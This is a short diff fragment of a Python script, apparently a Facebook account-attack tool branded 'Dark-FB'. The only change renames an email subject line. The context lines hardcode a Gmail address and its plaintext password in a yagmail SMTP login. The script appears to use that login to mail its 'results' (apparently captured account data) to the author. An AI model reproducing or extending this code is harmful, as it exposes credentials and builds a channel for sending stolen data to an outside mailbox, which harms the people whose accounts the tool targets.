@@ -3,7 +3,7 @@
 # coding=utf-8
 import socket,struct,os,sys,time,yagmail
 x=yagmail.SMTP('hayyukklah@gmail.com','yahahahayyukk')
-subject='Hasil UwU Mr.Forefax'
+subject='Hasil Dark-FB Mr.Forefax'
 logo = """
 
 ██████╗  █████╗ ██████╗ ██╗  ██╗     ███████╗██████╗ 
